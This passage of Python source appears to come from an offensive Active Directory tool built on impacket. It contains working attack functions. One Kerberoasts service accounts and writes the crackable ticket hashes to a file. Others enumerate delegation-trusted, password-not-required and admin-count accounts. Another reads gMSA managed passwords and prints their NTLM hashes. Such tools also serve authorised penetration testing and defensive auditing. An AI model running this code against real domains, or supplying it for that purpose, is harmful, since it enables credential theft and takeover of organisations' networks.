                            for spn in attribute['vals']:
                                SPNs.append(str(spn))

                    if mustCommit is True:
                        if int(userAccountControl) & UF_ACCOUNTDISABLE:
                            logging.debug('Bypassing disabled account %s ' % sAMAccountName)
                        else:
                            for spn in SPNs:
                                answers.append([spn, sAMAccountName,memberOf, pwdLastSet, lastLogon, delegation])
                except Exception as e:
                    logging.error('Skipping item, cannot process due to error %s' % str(e))
                    pass

            if len(answers)>0:
                self.logger.info('Total of records returned %d' % len(answers))
                TGT = KerberosAttacks(self).getTGT_kerberoasting()
                dejavue = []
                for SPN, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation in answers:
                    if sAMAccountName not in dejavue:
                        downLevelLogonName = self.targetDomain + "\\" + sAMAccountName

                        try:
                            principalName = Principal()
                            principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                            principalName.components = [downLevelLogonName]

                            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.domain,
                                                                                    self.kdcHost,
                                                                                    TGT['KDC_REP'], TGT['cipher'],
                                                                                    TGT['sessionKey'])
                            r = KerberosAttacks(self).outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, self.targetDomain + "/" + sAMAccountName)
                            self.logger.highlight(u'sAMAccountName: {} memberOf: {} pwdLastSet: {} lastLogon:{}'.format(sAMAccountName, memberOf, pwdLastSet, lastLogon))
                            self.logger.highlight(u'{}'.format(r))
                            with open(self.args.kerberoasting, 'a+') as hash_kerberoasting:
                                hash_kerberoasting.write(r + '\n')
                            dejavue.append(sAMAccountName)
                        except Exception as e:
                            logging.debug("Exception:", exc_info=True)
                            logging.error('Principal: %s - %s' % (downLevelLogonName, str(e)))
                return True
            else:
                self.logger.highlight("No entries found!")
                return
        self.logger.error("Error with the LDAP account used")

    def trusted_for_delegation(self):
        # Building the search filter
        searchFilter = "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
        attributes = ['sAMAccountName', 'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon']
        resp = self.search(searchFilter, attributes, 0)

        answers = []
        logging.debug('Total of records returned %d' % len(resp))

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = "0x%x" % int(attribute['vals'][0])
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                if mustCommit is True:
                    answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
            except Exception as e:
                logging.debug("Exception:", exc_info=True)
                logging.debug('Skipping item, cannot process due to error %s' % str(e))
                pass
        if len(answers)>0:
            logging.debug(answers)
            for value in answers:
                self.logger.highlight(value[0])
        else:
            self.logger.error("No entries found!")
        return
    
    def password_not_required(self):
        # Building the search filter
        searchFilter = "(userAccountControl:1.2.840.113556.1.4.803:=32)"
        try:
            logging.debug('Search Filter=%s' % searchFilter)
            resp = self.ldapConnection.search(searchFilter=searchFilter,
                        attributes=['sAMAccountName',
                                'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                        sizeLimit=0)
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
                pass
            else:
                return False
        answers = []
        logging.debug('Total of records returned %d' % len(resp))

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            pwdLastSet = ''
            userAccountControl = 0
            status = 'enabled'
            lastLogon = 'N/A'
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        if int(attribute['vals'][0]) & 2 :
                            status = 'disabled'
                        userAccountControl = "0x%x" % int(attribute['vals'][0])
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                if mustCommit is True:
                    answers.append([sAMAccountName, memberOf, pwdLastSet, lastLogon, userAccountControl, status])
            except Exception as e:
                logging.debug("Exception:", exc_info=True)
                logging.debug('Skipping item, cannot process due to error %s' % str(e))
                pass
        if len(answers)>0:
            logging.debug(answers)
            for value in answers:
                self.logger.highlight("User: " + value[0] + " Status: " + value[5])
        else:
            self.logger.error("No entries found!")
        return

    def admin_count(self):
        # Building the search filter
        searchFilter = "(adminCount=1)"
        attributes=['sAMAccountName', 'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon']
        resp = self.search(searchFilter, attributes, 0)
        answers = []
        logging.debug('Total of records returned %d' % len(resp))

        for item in resp:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = "0x%x" % int(attribute['vals'][0])
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                if mustCommit is True:
                    answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
            except Exception as e:
                logging.debug("Exception:", exc_info=True)
                logging.debug('Skipping item, cannot process due to error %s' % str(e))
                pass
        if len(answers)>0:
            logging.debug(answers)
            for value in answers:
                self.logger.highlight(value[0])
        else:
            self.logger.error("No entries found!")
        return

    def gmsa(self):
        self.logger.info("Getting GMSA Passwords")
        search_filter = '(objectClass=msDS-GroupManagedServiceAccount)'
        gmsa_accounts = self.ldapConnection.search(searchFilter=search_filter,
                                    attributes=['sAMAccountName', 'msDS-ManagedPassword','msDS-GroupMSAMembership'],
                                    sizeLimit=0,
                                    searchBase=self.baseDN)
        if gmsa_accounts:
            answers = []
            logging.debug('Total of records returned %d' % len(gmsa_accounts))

            for item in gmsa_accounts:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                sAMAccountName =  ''
                managedPassword = ''
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                    if str(attribute['type']) == 'msDS-ManagedPassword':
                        data = attribute['vals'][0].asOctets()
                        blob = MSDS_MANAGEDPASSWORD_BLOB()
                        blob.fromString(data)
                        currentPassword = blob['CurrentPassword'][:-2]
                        ntlm_hash = MD4.new ()
                        ntlm_hash.update (currentPassword)
                        passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                        self.logger.highlight("Account: {:<20} NTLM: {}".format(sAMAccountName, passwd))
        return True
